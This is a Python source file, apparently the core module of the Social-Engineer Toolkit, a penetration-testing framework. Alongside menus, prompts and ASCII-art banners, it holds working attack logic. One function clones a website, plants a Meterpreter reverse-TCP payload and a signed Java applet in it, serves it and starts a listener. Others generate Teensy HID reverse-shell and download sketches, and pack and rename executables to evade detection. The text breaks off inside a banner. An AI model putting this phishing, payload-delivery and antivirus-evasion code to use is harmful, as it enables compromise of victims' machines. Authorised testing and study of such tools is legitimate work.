import re
import sys
import socket
import subprocess
import shutil
import os
import time
import datetime
import random
import string
import inspect
import base64
from src.core import dictionaries
import src.core.minifakedns
import io
import trace
try:
    from urllib.request import urlopen
except ImportError:
    from urllib import urlopen
import multiprocessing
if sys.version_info >= (3, 0):
    from functools import *
try:
    import thread
except ImportError:
    import _thread as thread
try:
    raw_input
except:
    raw_input = input
try:
    from Crypto.Cipher import AES
except ImportError:
    print(
        "[!] The python-pycrypto python module not installed. You will lose the ability for encrypted communications.")
    pass
def definepath():
    if check_os() == "posix":
        if os.path.isfile("setoolkit"):
            return os.getcwd()
        else:
            return "/usr/local/share/setoolkit/"
    else:
        return os.getcwd()
def check_os():
    if os.name == "nt":
        operating_system = "windows"
    if os.name == "posix":
        operating_system = "posix"
    return operating_system
if check_os() == "posix":
    class bcolors:
        PURPLE = '\033[95m'
        CYAN = '\033[96m'
        DARKCYAN = '\033[36m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        BOLD = '\033[1m'
        UNDERL = '\033[4m'
        ENDC = '\033[0m'
        backBlack = '\033[40m'
        backRed = '\033[41m'
        backGreen = '\033[42m'
        backYellow = '\033[43m'
        backBlue = '\033[44m'
        backMagenta = '\033[45m'
        backCyan = '\033[46m'
        backWhite = '\033[47m'
        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''
else:
    class bcolors:
        PURPLE = ''
        CYAN = ''
        DARKCYAN = ''
        BLUE = ''
        GREEN = ''
        YELLOW = ''
        RED = ''
        BOLD = ''
        UNDERL = ''
        ENDC = ''
        backBlack = ''
        backRed = ''
        backGreen = ''
        backYellow = ''
        backBlue = ''
        backMagenta = ''
        backCyan = ''
        backWhite = ''
        def disable(self):
            self.PURPLE = ''
            self.CYAN = ''
            self.BLUE = ''
            self.GREEN = ''
            self.YELLOW = ''
            self.RED = ''
            self.ENDC = ''
            self.BOLD = ''
            self.UNDERL = ''
            self.backBlack = ''
            self.backRed = ''
            self.backGreen = ''
            self.backYellow = ''
            self.backBlue = ''
            self.backMagenta = ''
            self.backCyan = ''
            self.backWhite = ''
            self.DARKCYAN = ''
def setprompt(category, text):
    if category == '0' and text == "":
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> "
    if category == '0':
        return bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC + "> " + text + ": "
    else:
        prompt = bcolors.UNDERL + bcolors.DARKCYAN + "set" + bcolors.ENDC
        if text == "":
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + \
                    bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring += ">"
            return promptstring
        else:
            for level in category:
                level = dictionaries.category(level)
                prompt += ":" + bcolors.UNDERL + \
                    bcolors.DARKCYAN + level + bcolors.ENDC
            promptstring = str(prompt)
            promptstring = promptstring + "> " + text + ": "
            return promptstring
def yesno_prompt(category, text):
    valid_response = False
    while not valid_response:
        response = raw_input(setprompt(category, text))
        response = str.lower(response)
        if response == "no" or response == "n":
            response = "NO"
            valid_response = True
        elif response == "yes" or response == "y":
            response = "YES"
            valid_response = True
        else:
            print_warning("valid responses are 'n|y|N|Y|no|yes|No|Yes|NO|YES'")
    return response
def return_continue():
    print(("\n      Press " + bcolors.RED +
           "<return> " + bcolors.ENDC + "to continue"))
    pause = raw_input()
DEBUG_LEVEL = 0
debugFrameString = '-' * 72
def debug_msg(currentModule, message, msgType):
    if DEBUG_LEVEL == 0:
        pass  # stop evaluation efficiently
    else:
        if msgType <= DEBUG_LEVEL:
            print(bcolors.RED + "\nDEBUG_MSG: from module '" +
                  currentModule + "': " + message + bcolors.ENDC)
            if DEBUG_LEVEL == 2 or DEBUG_LEVEL == 4 or DEBUG_LEVEL == 6:
                raw_input("waiting for <ENTER>\n")
def mod_name():
    frame_records = inspect.stack()[1]
    calling_module = inspect.getmodulename(frame_records[1])
    return calling_module
def print_status(message):
    print(bcolors.GREEN + bcolors.BOLD + "[*] " + bcolors.ENDC + str(message))
def print_info(message):
    print(bcolors.BLUE + bcolors.BOLD + "[-] " + bcolors.ENDC + str(message))
def print_info_spaces(message):
    print(bcolors.BLUE + bcolors.BOLD + "  [-] " + bcolors.ENDC + str(message))
def print_warning(message):
    print(bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + str(message))
def print_error(message):
    print(bcolors.RED + bcolors.BOLD +
          "[!] " + bcolors.ENDC + bcolors.RED + str(message) + bcolors.ENDC)
def get_version():
    define_version = open("src/core/set.version", "r").read().rstrip()
    return define_version
class create_menu:
    def __init__(self, text, menu):
        self.text = text
        self.menu = menu
        print(text)
        for i, option in enumerate(menu):
            menunum = i + 1
            match = re.search("0D", option)
            if not match:
                if menunum < 10:
                    print(('   %s) %s' % (menunum, option)))
                else:
                    print(('  %s) %s' % (menunum, option)))
            else:
                print('\n  99) Return to Main Menu\n')
        return
def detect_public_ip():
    """
    Helper function to auto-detect our public IP(v4) address.
    """
    rhost = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    rhost.connect(('google.com', 0))
    rhost.settimeout(2)
    return rhost.getsockname()[0]
def validate_ip(address):
    """
    Validates that a given string is an IPv4 dotted quad.
    """
    try:
        if socket.inet_aton(address):
            if len(address.split('.')) == 4:
                debug_msg("setcore", "this is a valid IP address", 5)
                return True
            else:
                print_error("This is not a valid IP address...")
                raise socket.error
        else:
            raise socket_error
    except socket.error:
        return False
def meta_path():
    trigger = 0
    try:
        msf_path = check_config("METASPLOIT_PATH=")
        if not msf_path.endswith("/"):
            msf_path = msf_path + "/"
        if os.path.isfile(msf_path + "msfconsole"):
            trigger = 1
        if os.path.isfile("/usr/bin/msfconsole"):
            if trigger == 0:
                msf_path = "/usr/bin/"
                trigger = 1
        if os.path.isfile("/opt/metasploit-framework/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/metasploit-framework/"
                trigger = 1
        if os.path.isfile("/opt/metasploit/apps/pro/msf3/msfconsole"):
            if trigger == 0:
                msf_path = ""
                trigger = 1
        if os.path.isfile("/opt/framework3/msf3/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/framework3/msf3/"
                trigger = 1
        if os.path.isfile("/opt/framework/msf3/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/framework/msf3/"
                trigger = 1
        if os.path.isfile("/opt/metasploit/msf3/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/metasploit/msf3/"
                trigger = 1
        if os.path.isfile("/opt/metasploit-framework/msfconsole"):
            if trigger == 0:
                msf_path = "/opt/metasploit-framework/"
                trigger = 1
        if os.path.isfile("/pentest/exploitation/metasploit/msfconsole"):
            if trigger == 0:
                msf_path = "/pentest/exploitation/metasploit/"
                trigger = 1
        if os.path.isfile("/usr/local/share/metasploit-framework/msfconsole"):
            if trigger == 0:
                msf_path = "/usr/local/share/metasploit-framework/"
                trigger = 1
        if trigger == 0:
            print_error(
                "Metasploit path not found. These payloads will be disabled.")
            print_error(
                "Please configure Metasploit's path in the /etc/setoolkit/set.config file.")
            msf_path = False
    except Exception as e:
        print_status("Something went wrong. Printing error: " + str(e))
    check_metasploit = check_config("METASPLOIT_MODE=").lower()
    if check_metasploit != "on":
        msf_path = False
    return msf_path
def meta_database():
    meta_path = open("/etc/setoolkit/set.config", "r").readlines()
    for line in meta_path:
        line = line.rstrip()
        match = re.search("METASPLOIT_DATABASE=", line)
        if match:
            line = line.replace("METASPLOIT_DATABASE=", "")
            msf_database = line.rstrip()
            return msf_database
def grab_ipaddress():
    try:
        revipaddr = detect_public_ip()
        rhost = raw_input(setprompt("0", "IP address or URL (www.ex.com) for the payload listener (LHOST) [" + revipaddr + "]"))
        if rhost == "": rhost = revipaddr
    except Exception:
        rhost = raw_input(setprompt("0", "Enter your interface/reverse listener IP Address or URL"))
    if validate_ip(rhost) == False:
        while 1:
            choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
            if choice == "" or choice.lower() == "y":
                print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
                break
            else:
                rhost = raw_input(setprompt(["2"], "IP address for the reverse connection [" + rhost + "]"))
                if validate_ip(rhost) == True: break
                else:
                    choice = raw_input(setprompt(["2"], "This is not an IP address. Are you using a hostname? [y/n] "))
                    if choice == "" or choice.lower() == "y":
                        print_status("Roger that ghostrider. Using hostnames moving forward (hostnames are 1337, nice job)..")
                        break
    return rhost
def cleanup_routine():
    try:
        shutil.copyfile("%s/src/html/Signed_Update.jar.orig" %
                        (definepath()), userconfigpath + "Signed_Update.jar")
        if os.path.isfile("newcert.pem"):
            os.remove("newcert.pem")
        if os.path.isfile(userconfigpath + "interfaces"):
            os.remove(userconfigpath + "interfaces")
        if os.path.isfile("src/html/1msf.raw"):
            os.remove("src/html/1msf.raw")
        if os.path.isfile("src/html/2msf.raw"):
            os.remove("src/html/2msf.raw")
        if os.path.isfile("msf.exe"):
            os.remove("msf.exe")
        if os.path.isfile("src/html/index.html"):
            os.remove("src/html/index.html")
        if os.path.isfile(userconfigpath + "Signed_Update.jar"):
            os.remove(userconfigpath + "Signed_Update.jar")
        if os.path.isfile(userconfigpath + "version.lock"):
            os.remove(userconfigpath + "version.lock")
        src.core.minifakedns.stop_dns_server()
    except:
        pass
def update_set():
    backbox = check_backbox()
    kali = check_kali()
    if backbox == "BackBox":
        print_status(
            "You are running BackBox Linux which already implements SET updates.")
        print_status(
            "No need for further operations, just update your system.")
        time.sleep(2)
    elif kali == "Kali":
        print_status("You are running Kali Linux which maintains SET updates.")
        time.sleep(2)
    else:
        print_info("Kali or BackBox Linux not detected, manually updating..")
        print_info("Updating the Social-Engineer Toolkit, be patient...")
        print_info("Performing cleanup first...")
        subprocess.Popen("git clean -fd", shell=True).wait()
        print_info("Updating... This could take a little bit...")
        subprocess.Popen("git pull", shell=True).wait()
        print_status("The updating has finished, returning to main menu..")
        time.sleep(2)
def help_menu():
    fileopen = open("README.md", "r").readlines()
    for line in fileopen:
        line = line.rstrip()
        print(line)
    fileopen = open("readme/CREDITS", "r").readlines()
    print("\n")
    for line in fileopen:
        line = line.rstrip()
        print(line)
    return_continue()
def date_time():
    now = str(datetime.datetime.today())
    return now
def generate_random_string(low, high):
    length = random.randint(low, high)
    letters = string.ascii_letters # + string.digits
    return ''.join([random.choice(letters) for _ in range(length)])
def site_cloner(website, exportpath, *args):
    grab_ipaddress()
    ipaddr = grab_ipaddress()
    filewrite = open(userconfigpath + "interface", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = open(userconfigpath + "ipaddr", "w")
    filewrite.write(ipaddr)
    filewrite.close()
    filewrite = open(userconfigpath + "site.template", "w")
    filewrite.write("URL=" + website)
    filewrite.close()
    if args[0] == "java":
        filewrite = open(userconfigpath + "attack_vector", "w")
        filewrite.write("java")
        filewrite.close()
    sys.path.append("src/webattack/web_clone")
    try:
        debug_msg("setcore", "importing 'src.webattack.web_clone.cloner'", 1)
        module_reload(cloner)
    except:
        debug_msg("setcore", "importing 'src.webattack.web_clone.cloner'", 1)
        import cloner
    print_status("Site has been successfully cloned and is: " + exportpath)
    subprocess.Popen("mkdir '%s';cp %s/web_clone/* '%s'" % (exportpath, userconfigpath,
                                                            exportpath), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
def start_web_server(directory):
    try:
        import socketserver
        import http.server
        class ReusableTCPServer(socketserver.TCPServer):
            allow_reuse_address = True
        httpd = ReusableTCPServer(
            ("0.0.0.0", 80), http.server.SimpleHTTPRequestHandler)
        os.chdir(directory)
        thread.start_new_thread(httpd.serve_forever, ())
    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()
def start_web_server_unthreaded(directory):
    try:
        import thread
        import socketserver
        import http.server
        class ReusableTCPServer(socketserver.TCPServer):
            allow_reuse_address = True
        httpd = ReusableTCPServer(
            ("0.0.0.0", 80), http.server.SimpleHTTPRequestHandler)
        os.chdir(directory)
        httpd.serve_forever()
        os.chdir(directory)
    except KeyboardInterrupt:
        print_info("Exiting the SET web server...")
        httpd.socket.close()
def java_applet_attack(website, port, directory):
    meterpreter_reverse_tcp_exe(port)
    site_cloner(website, directory, "java")
    filename = check_options("MSF.EXE=")
    if check_options != 0:
        subprocess.Popen("cp %s/msf.exe %s/%s" % (userconfigpath, directory, filename),
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    applet_name = check_options("APPLET_NAME=")
    if applet_name == "":
        applet_name = generate_random_string(6, 15) + ".jar"
    subprocess.Popen(
        "cp %s/Signed_Update.jar %s/%s" % (userconfigpath, directory, applet_name),
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    start_web_server(directory)
    print_info("Starting the multi/handler through Metasploit...")
    metasploit_listener_start("windows/meterpreter/reverse_tcp", port)
def teensy_pde_generator(attack_method):
    ipaddr = grab_ipaddress()
    if attack_method == "beef":
        filename = open("src/teensy/beef.ino", "r")
        filewrite = open(userconfigpath + "reports/beef.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Beef Attack Vector under %s/reports/beef.ino" % (userconfigpath))
    if attack_method == "powershell_down":
        filename = open("src/teensy/powershell_down.ino", "r")
        filewrite = open(userconfigpath + "reports/powershell_down.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_down.ino" % (userconfigpath))
    if attack_method == "powershell_reverse":
        filename = open("src/teensy/powershell_reverse.ino", "r")
        filewrite = open(userconfigpath + "reports/powershell_reverse.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/powershell_reverse.ino" % (userconfigpath))
    if attack_method == "java_applet":
        filename = open("src/teensy/java_applet.ino", "r")
        filewrite = open(userconfigpath + "reports/java_applet.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/java_applet.ino" % (userconfigpath))
    if attack_method == "wscript":
        filename = open("src/teensy/wscript.ino", "r")
        filewrite = open(userconfigpath + "reports/wscript.ino", "w")
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/wscript.ino" % (userconfigpath))
    if attack_method != "binary2teensy":
        for line in filename:
            line = line.rstrip()
            match = re.search("IPADDR", line)
            if match:
                line = line.replace("IPADDR", ipaddr)
            filewrite.write(line)
    if attack_method == "binary2teensy":
        import src.teensy.binary2teensy
        teensy_string = (
            "Successfully generated Teensy HID Attack Vector under %s/reports/binary2teensy.ino" % (userconfigpath))
    print_status(teensy_string)
def windows_root():
    return os.environ['WINDIR']
def log(error):
    try:
        if not os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
            filewrite = open("%s/src/logs/set_logfile.log" %
                             (definepath()), "w")
            filewrite.write("")
            filewrite.close()
        if os.path.isfile("%s/src/logs/set_logfile.log" % (definepath())):
            error = str(error)
            filewrite = open("%s/src/logs/set_logfile.log" %
                             (definepath()), "a")
            filewrite.write("ERROR: " + date_time() + ": " + error + "\n")
            filewrite.close()
    except IOError as err:
        pass
def upx(path_to_file):
    fileopen = open("/etc/setoolkit/set.config", "r")
    for line in fileopen:
        line = line.rstrip()
        match = re.search("UPX_PATH=", line)
        if match:
            upx_path = line.replace("UPX_PATH=", "")
    if not os.path.isfile(upx_path):
        print_warning(
            "UPX was not detected. Try configuring the set_config again.")
    if os.path.isfile(upx_path):
        print_info(
            "Packing the executable and obfuscating PE file randomly, one moment.")
        subprocess.Popen(
            "%s -9 -q -o %s/temp.binary %s" % (upx_path, userconfigpath, path_to_file),
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        subprocess.Popen("mv %s/temp.binary %s" % (userconfigpath, path_to_file),
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
        random_string = generate_random_string(3, 3).upper()
        fileopen = open(path_to_file, "rb")
        filewrite = open(userconfigpath + "temp.binary", "wb")
        data = fileopen.read()
        filewrite.write(data.replace("UPX", random_string, 4))
        filewrite.close()
        subprocess.Popen("mv %s/temp.binary %s" % (userconfigpath, path_to_file),
                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
    time.sleep(3)
def show_banner(define_version, graphic):
    if graphic == "1":
        if check_os() == "posix":
            os.system("clear")
        if check_os() == "windows":
            os.system("cls")
        show_graphic()
    else:
        os.system("clear")
    print(bcolors.BLUE + """
[---]        The Social-Engineer Toolkit (""" + bcolors.YELLOW + """SET""" + bcolors.BLUE + """)         [---]
[---]        Created by:""" + bcolors.RED + """ David Kennedy """ + bcolors.BLUE + """(""" + bcolors.YELLOW + """ReL1K""" + bcolors.BLUE + """)         [---]
                      Version: """ + bcolors.RED + """%s""" % (define_version) + bcolors.BLUE + """
                    Codename: '""" + bcolors.YELLOW + """Maverick""" + bcolors.ENDC + bcolors.BLUE + """'
[---]        Follow us on Twitter: """ + bcolors.PURPLE + """@TrustedSec""" + bcolors.BLUE + """         [---]
[---]        Follow me on Twitter: """ + bcolors.PURPLE + """@HackingDave""" + bcolors.BLUE + """        [---]
[---]       Homepage: """ + bcolors.YELLOW + """https://www.trustedsec.com""" + bcolors.BLUE + """       [---]
""" + bcolors.GREEN + """        Welcome to the Social-Engineer Toolkit (SET).
         The one stop shop for all of your SE needs.
""")
    print(bcolors.BOLD + """   The Social-Engineer Toolkit is a product of TrustedSec.\n\n           Visit: """ +
          bcolors.GREEN + """https://www.trustedsec.com\n""" + bcolors.ENDC)
    print(bcolors.BLUE + """   It's easy to update using the PenTesters Framework! (PTF)\nVisit """ + bcolors.YELLOW +
          """https://github.com/trustedsec/ptf""" + bcolors.BLUE + """ to update all your tools!\n\n""" + bcolors.ENDC)
    cv = get_version()
    try:
        version = ""
        def pull_version():
            if not os.path.isfile(userconfigpath + "version.lock"):
                try:
                    url = (
                        'https://raw.githubusercontent.com/trustedsec/social-engineer-toolkit/master/src/core/set.version')
                    version = urlopen(url).read().rstrip().decode('utf-8')
                    filewrite = open(userconfigpath + "version.lock", "w")
                    filewrite.write(version)
                    filewrite.close()
                except KeyboardInterrupt:
                    version = "keyboard interrupt"
            else:
                version = open(userconfigpath + "version.lock", "r").read()
            if cv != version:
                if version != "":
                    print(bcolors.RED + "          There is a new version of SET available.\n                    " + bcolors.GREEN + " Your version: " + bcolors.RED + cv + bcolors.GREEN +
                          "\n                  Current version: " + bcolors.ENDC + bcolors.BOLD + version + bcolors.YELLOW + "\n\nPlease update SET to the latest before submitting any git issues.\n\n" + bcolors.ENDC)
        p = multiprocessing.Process(target=pull_version)
        p.start()
        p.join(8)
        if p.is_alive():
            print(
                bcolors.RED + " Unable to check for new version of SET (is your network up?)\n" + bcolors.ENDC)
            p.terminate()
            p.join()
    except Exception as err:
        print(err)
def show_graphic():
    menu = random.randrange(2, 15)
    if menu == 2:
        print(bcolors.YELLOW + r"""
                 .--.  .--. .-----.
                : .--': .--'`-. .-'
                `. `. : `;    : :
                 _`, :: :__   : :
                `.__.'`.__.'  :_;   """ + bcolors.ENDC)
        return
    if menu == 3:
        print(bcolors.GREEN + r"""
          _______________________________
         /   _____/\_   _____/\__    ___/
         \_____  \  |    __)_   |    |
         /        \ |        \  |    |
        /_______  //_______  /  |____|
                \/         \/            """ + bcolors.ENDC)
        return
    if menu == 4:
        print(bcolors.BLUE + r"""
            :::===  :::===== :::====
            :::     :::      :::====
             =====  ======     ===
                === ===        ===
            ======  ========   ===
""" + bcolors.ENDC)
    if menu == 5:
        print(bcolors.RED + r"""
           ..######..########.########
           .##....##.##..........##...
           .##.......##..........##...
           ..######..######......##...
           .......##.##..........##...
           .##....##.##..........##...
           ..######..########....##...  """ + bcolors.ENDC)
        return
    if menu == 6:
        print(bcolors.PURPLE + r'''
         .M"""bgd `7MM"""YMM MMP""MM""YMM
        ,MI    "Y   MM    `7 P'   MM   `7
        `MMb.       MM   d        MM
          `YMMNq.   MMmmMM        MM
        .     `MM   MM   Y  ,     MM
        Mb     dM   MM     ,M     MM
        P"Ybmmd"  .JMMmmmmMMM   .JMML.''' + bcolors.ENDC)
        return
    if menu == 7:
        print(bcolors.YELLOW + r"""
              ________________________
              __  ___/__  ____/__  __/
              _____ \__  __/  __  /
              ____/ /_  /___  _  /
              /____/ /_____/  /_/     """ + bcolors.ENDC)
        return
    if menu == 8:
        print(bcolors.RED + r'''
          !\_________________________/!\
          !!                         !! \
          !! Social-Engineer Toolkit !!  \
          !!                         !!  !
          !!          Free           !!  !
          !!                         !!  !
          !!          #hugs          !!  !
          !!                         !!  !
          !!      By: TrustedSec     !!  /
          !!_________________________!! /
          !/_________________________\!/
             __\_________________/__/!_
            !_______________________!/
          ________________________
         /oooo  oooo  oooo  oooo /!
        /ooooooooooooooooooooooo/ /
       /ooooooooooooooooooooooo/ /
      /C=_____________________/_/''' + bcolors.ENDC)
    if menu == 9:
        print(bcolors.YELLOW + """
         01011001011011110111010100100000011100
         10011001010110000101101100011011000111
         10010010000001101000011000010111011001
         10010100100000011101000110111100100000
         01101101011101010110001101101000001000
         00011101000110100101101101011001010010
         00000110111101101110001000000111100101
         10111101110101011100100010000001101000
         01100001011011100110010001110011001000
         00001110100010110100101001001000000101
         01000110100001100001011011100110101101
         11001100100000011001100110111101110010
         00100000011101010111001101101001011011
         10011001110010000001110100011010000110
         01010010000001010011011011110110001101
         10100101100001011011000010110101000101
         01101110011001110110100101101110011001
         01011001010111001000100000010101000110
         11110110111101101100011010110110100101
         11010000100000001010100110100001110101
         011001110111001100101010""" + bcolors.ENDC)
    if menu == 10:
        print(bcolors.GREEN + """
                          .  ..
                       MMMMMNMNMMMM=
                   .DMM.           .MM$
                 .MM.                 MM,.
                 MN.                    MM.
               .M.                       MM
              .M   .....................  NM
              MM   .8888888888888888888.   M7
             .M    88888888888888888888.   ,M
             MM       ..888.MMMMM    .     .M.
             MM         888.MMMMMMMMMMM     M
             MM         888.MMMMMMMMMMM.    M
             MM         888.      NMMMM.   .M
              M.        888.MMMMMMMMMMM.   ZM
              NM.       888.MMMMMMMMMMM    M:
              .M+      .....              MM.
               .MM.                     .MD
                 MM .                  .MM
                  $MM                .MM.
                    ,MM?          .MMM
                       ,MMMMMMMMMMM
                https://www.trustedsec.com""" + bcolors.ENDC)
    if menu == 11:
        print(bcolors.backBlue + r"""
                          _                                           J
                         /-\                                          J
                    _____|#|_____                                     J
                   |_____________|                                    J
                  |_______________|                                   E
                 ||_POLICE_##_BOX_||                                  R
                 | |-|-|-|||-|-|-| |                                  O
                 | |-|-|-|||-|-|-| |                                  N
                 | |_|_|_|||_|_|_| |                                  I
                 | ||~~~| | |---|| |                                  M
                 | ||~~~|!|!| O || |                                  O
                 | ||~~~| |.|___|| |                                  O
                 | ||---| | |---|| |                                  O
                 | ||   | | |   || |                                  O
                 | ||___| | |___|| |                                  !
                 | ||---| | |---|| |                                  !
                 | ||   | | |   || |                                  !
                 | ||___| | |___|| |                                  !
                 |-----------------|                                  !
                 |   Timey Wimey   |                                  !
                 -------------------                                  !""" + bcolors.ENDC)
    if menu == 12:
        print(bcolors.YELLOW + r'''
           ,..-,
         ,;;f^^"""-._
        ;;'          `-.
       ;/               `.
       ||  _______________\_______________________
       ||  |HHHHHHHHHHPo"~~\"o?HHHHHHHHHHHHHHHHHHH|
       ||  |HHHHHHHHHP-._   \,'?HHHHHHHHHHHHHHHHHH|
        |  |HP;""?HH|    """ |_.|HHP^^HHHHHHHHHHHH|
        |  |HHHb. ?H|___..--"|  |HP ,dHHHPo'|HHHHH|
        `| |HHHHHb.?Hb    .--J-dHP,dHHPo'_.rdHHHHH|
         \ |HHHi.`;;.H`-./__/-'H_,--'/;rdHHHHHHHHH|
           |HHHboo.\ `|"\"/"\" '/\ .'dHHHHHHHHHHHH|
           |HHHHHHb`-|.  \|  \ / \/ dHHHHHHHHHHHHH|
           |HHHHHHHHb| \ |\   |\ |`|HHHHHHHHHHHHHH|
           |HHHHHHHHHb  \| \  | \| |HHHHHHHHHHHHHH|
           |HHHHHHHHHHb |\  \|  |\|HHHHHHHHHHHHHHH|
           |HHHHHHHHHHHb| \  |  / dHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHb  \/ \/ .fHHHHHHHHHHHHHHH|
           |HHHHHHHHHHHHH| /\ /\ |HHHHHHHHHHHHHHHH|
           |""""""""""""""""""""""""""""""""""""""|
           |,;=====.     ,-.  =.       ,=,,=====. |
           |||     '    //"\\   \\   //  ||     ' |
           |||         ,/' `\.  `\. ,/'  ``=====. |
           |||     .   //"""\\   \\_//    .     |||
           |`;=====' =''     ``=  `-'     `=====''|
           |______________________________________|
	''')
    if menu == 13:
        print(bcolors.RED + r"""
                      ..:::::::::..
                  ..:::aad8888888baa:::..
              .::::d:?88888888888?::8b::::.
            .:::d8888:?88888888??a888888b:::.
          .:::d8888888a8888888aa8888888888b:::.
         ::::dP::::::::88888888888::::::::Yb::::
        ::::dP:::::::::Y888888888P:::::::::Yb::::
       ::::d8:::::::::::Y8888888P:::::::::::8b::::
      .::::88::::::::::::Y88888P::::::::::::88::::.
      :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
      :::::::Y88888888888P::|::Y88888888888P:::::::
      ::::::::::::::::888:::|:::888::::::::::::::::
      `:::::::::::::::8888888888888b::::::::::::::'
       :::::::::::::::88888888888888::::::::::::::
        :::::::::::::d88888888888888:::::::::::::
         ::::::::::::88::88::88:::88::::::::::::
          `::::::::::88::88::88:::88::::::::::'
            `::::::::88::88::P::::88::::::::'
              `::::::88::88:::::::88::::::'
                 ``:::::::::::::::::::''
                      ``:::::::::''""" + bcolors.ENDC)
    if menu == 14:
        print(bcolors.BOLD + """
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
XX                                                                          XX
XX   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMMMMMss'''                          '''ssMMMMMMMMMMMMMMMM   XX
XX   MMMMMMMMMMMMyy''                                    ''yyMMMMMMMMMMMM   XX
XX   MMMMMMMMyy''                                            ''yyMMMMMMMM   XX
XX   MMMMMy''                                                    ''yMMMMM   XX
XX   MMMy'                                                          'yMMM   XX
XX   Mh'                                                              'hM   XX
XX   -                                                                  -   XX
XX                                                                          XX
XX   ::                                                                ::   XX
XX   MMhh.        ..hhhhhh..                      ..hhhhhh..        .hhMM   XX
XX   MMMMMh   ..hhMMMMMMMMMMhh.                .hhMMMMMMMMMMhh..   hMMMMM   XX
XX   ---MMM .hMMMMdd:::dMMMMMMMhh..        ..hhMMMMMMMd:::ddMMMMh. MMM---   XX
XX   MMMMMM MMmm''      'mmMMMMMMMMyy.  .yyMMMMMMMMmm'      ''mmMM MMMMMM   XX
XX   ---mMM ''             'mmMMMMMMMM  MMMMMMMMmm'             '' MMm---   XX
XX   yyyym'    .              'mMMMMm'  'mMMMMm'              .    'myyyy   XX
XX   mm''    .y'     ..yyyyy..  ''''      ''''  ..yyyyy..     'y.    ''mm   XX
XX           MN    .sMMMMMMMMMss.   .    .   .ssMMMMMMMMMs.    NM           XX
XX           N`    MMMMMMMMMMMMMN   M    M   NMMMMMMMMMMMMM    `N           XX
XX            +  .sMNNNNNMMMMMN+   `N    N`   +NMMMMMNNNNNMs.  +            XX
XX              o+++     ++++Mo    M      M    oM++++     +++o              XX
XX                                oo      oo                                XX
XX           oM                 oo          oo                 Mo           XX
XX         oMMo                M              M                oMMo         XX
XX       +MMMM                 s              s                 MMMM+       XX
XX      +MMMMM+            +++NNNN+        +NNNN+++            +MMMMM+      XX
XX     +MMMMMMM+       ++NNMMMMMMMMN+    +NMMMMMMMMNN++       +MMMMMMM+     XX
XX     MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM     XX
XX     yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy     XX
XX   m  yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy  m   XX
XX   MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM   XX
XX   MMMm .yyMMMMMMMMMMMMMMMM     MMMMMMMMMM     MMMMMMMMMMMMMMMMyy. mMMM   XX
XX   MMMMd   ''''hhhhh       odddo          obbbo        hhhh''''   dMMMM   XX
XX   MMMMMd             'hMMMMMMMMMMddddddMMMMMMMMMMh'             dMMMMM   XX
XX   MMMMMMd              'hMMMMMMMMMMMMMMMMMMMMMMh'              dMMMMMM   XX
XX   MMMMMMM-               ''ddMMMMMMMMMMMMMMdd''               -MMMMMMM   XX
XX   MMMMMMMM                   '::dddddddd::'                   MMMMMMMM   XX
XX   MMMMMMMM-                                                  -MMMMMMMM   XX
XX   MMMMMMMMM                                                  MMMMMMMMM   XX
XX   MMMMMMMMMy                                                yMMMMMMMMM   XX
